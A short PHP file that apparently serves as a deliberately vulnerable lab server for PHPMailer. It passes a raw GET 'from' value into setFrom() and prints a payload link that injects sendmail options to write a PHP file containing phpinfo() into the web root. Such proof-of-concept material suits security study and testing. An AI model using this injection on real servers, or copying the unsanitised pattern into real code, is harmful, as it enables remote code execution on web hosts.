<?php
require('vendor/phpmailer/phpmailer/PHPMailerAutoload.php');

if (! isset ($_GET['from'])) {
	echo '<a href="/?from=a%27(%20-OQueueDirectory=/tmp%20-X/var/www/html/x.php%20)@a.com">/?from=a%27(%20-OQueueDirectory=/tmp%20-X/var/www/html/x.php%20)@a.com</a>';
	exit;
}

$mail = new PHPMailer;
$mail->setFrom($_GET['from'], 'Vuln Server');
$mail->Subject = 'subject';
$mail->addAddress('c@localhost.localdomain', 'attacker');
$mail->msgHTML('test');
$mail->AltBody = 'Body <?php phpinfo(); ?>';

$mail->send();
?>
